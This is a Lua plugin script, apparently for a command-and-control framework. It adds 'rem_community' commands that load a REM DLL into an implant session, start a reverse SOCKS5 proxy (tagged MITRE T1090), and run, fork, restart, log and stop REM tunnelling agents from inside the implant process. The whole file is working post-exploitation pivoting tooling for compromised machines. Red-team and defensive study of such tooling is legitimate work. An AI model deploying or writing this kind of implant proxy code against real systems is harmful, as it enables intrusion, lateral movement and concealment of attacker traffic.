local function rem_path(arch, ext)
    return "module/rem_community" .. "." .. arch .. "." .. ext
end


function build_rem_cmdline(pipe, mod, remote_url, local_url)
    local link = rem_link(pipe)
    local args = { "-c", link, "-m", mod }
    if remote_url and remote_url ~= "" then
        table.insert(args, "-r")
        table.insert(args, remote_url)
    end
    if local_url and local_url ~= "" then

        table.insert(args, "-l")
        table.insert(args, local_url)
    end
    return args
end

function load_rem()
    arch = barch(active())
    return load_module(active(), "rem", script_resource("modules/rem".. "." .. arch .. ".dll"))
end

local rem_load_cmd = command("rem_community:load", load_rem, "load rem with rem.dll", "")

help("rem_community:load", [[
Load the REM community module (rem.dll) into the current session.

**Usage:**

```
rem_community load
```

> No arguments required. Loads the REM DLL matching the session architecture.
]])


function run_socks5(arg_1, flag_port, flag_user, flag_pass)
    return rem_dial(active(), arg_1,
            build_rem_cmdline(arg_1, "reverse", "socks5://" .. flag_user .. ":" .. flag_pass .. "@0.0.0.0:" .. flag_port, ""))
end

local rem_socks_cmd = command("rem_community:socks5", run_socks5, "serving socks5 with rem", "T1090")
bind_args_completer(rem_socks_cmd, { rem_completer() })

help("rem_community:socks5", [[
Start a SOCKS5 proxy through a REM pipeline.

**Usage:**

```
rem_community socks5 <pipeline_name> --port 1080 --user admin --pass secret
```

> First argument is the REM pipeline name. `--port`, `--user`, `--pass` configure the SOCKS5 proxy.
]])

function run_rem_connect(arg_1)
    rem_dial(active(), arg_1, { "-c", rem_link(arg_1), "-n" })
end

local rem_connect_cmd = command("rem_community:connect", run_rem_connect, "connect to rem", "")
bind_args_completer(rem_connect_cmd, { rem_completer() })

help("rem_community:connect", [[
Connect to a REM pipeline.

**Usage:**

```
rem_community connect <pipeline_name>
```

> First argument is the REM pipeline name.
]])

function run_rem_fork(arg_1, arg_2, flag_mod, flag_remote_url, flag_local_url)
    local rpc = require("rpc")
    local task = rpc.RemAgentCtrl(active():Context(), ProtobufMessage.New("clientpb.REMAgent", {
        PipelineId = arg_1,
        Id = arg_2,
        Args = { "-r", flag_remote_url, "-l", flag_local_url, "-m", flag_mod },
    }))
end

local rem_fork = command("rem_community:fork", run_rem_fork, "fork rem", "")
bind_args_completer(rem_fork, { rem_completer(), rem_agent_completer() })

help("rem_community:fork", [[
Fork a REM agent with new connection parameters.

**Usage:**

```
rem_community fork <pipeline_name> <agent_id> --mod reverse --remote_url socks5://0.0.0.0:1080 --local_url tcp://127.0.0.1:8080
```

> First argument: pipeline name. Second argument: agent ID.
]])


function run_rem(flag_pipe, args)
    local session = active()
    local arch = barch(active())
    table.insert(args, "-c")
    table.insert(args, rem_link(flag_pipe))
    return execute_exe(session, script_resource(rem_path(arch, "exe")), args, true, 600, arch, "", new_sac())
end

local rem_run_cmd = command("rem_community:run", run_rem, "run rem", "")
bind_flags_completer(rem_run_cmd, { pipe = rem_completer() })

help("rem_community:run", [[
Run the REM executable in the implant process.

**Usage:**

```
rem_community run --pipe <pipeline_name>
```

> `--pipe` specifies the REM pipeline to connect to.
]])


function restart_rem_agent(arg_1, arg_2)
    local session = active()
    local path = rem_path(session.Os.Arch, "exe")
    local agent
    for k, v in pairs(pivots()) do
        if v.RemAgentId == arg_2 then
            agent = v
            break
        end
    end
    local args = { "-r", agent.RemoteURL, "-l", agent.LocalURL, "-m", agent.Mod, "-a", agent.RemAgentId }
    table.insert(args, "-c")
    table.insert(args, rem_link(arg_1))

    return execute_exe(session, script_resource(path), args, true, 600, session.Os.Arch, "", new_sac())
end

function get_rem_log(arg_1, arg_2)
    local rpc = require("rpc")
    local log = rpc.RemAgentLog(active():Context(), ProtobufMessage.New("clientpb.REMAgent", {
        Id = arg_2,
        PipelineId = arg_1,
    }))
    print(log.Log)
end

local log_cmd = command("rem_community:log", get_rem_log, "get rem log", "")
bind_args_completer(log_cmd, { rem_completer(), rem_agent_completer() })

help("rem_community:log", [[
Get logs from a REM agent.

**Usage:**

```
rem_community log <pipeline_name> <agent_id>
```

> First argument: pipeline name. Second argument: agent ID.
]])


function run_rem_stop(arg_1, arg_2)
    local rpc = require("rpc")
    local task = rpc.RemAgentStop(active():Context(), ProtobufMessage.New("clientpb.REMAgent", {
        PipelineId = arg_1,
        Id = arg_2,
    }))
end

local rem_stop_cmd = command("rem_community:stop", run_rem_stop, "stop rem", "")
bind_args_completer(rem_stop_cmd, { rem_completer(), rem_agent_completer() })

help("rem_community:stop", [[
Stop a running REM agent.

**Usage:**

```
rem_community stop <pipeline_name> <agent_id>
```

> First argument: pipeline name. Second argument: agent ID.
]])
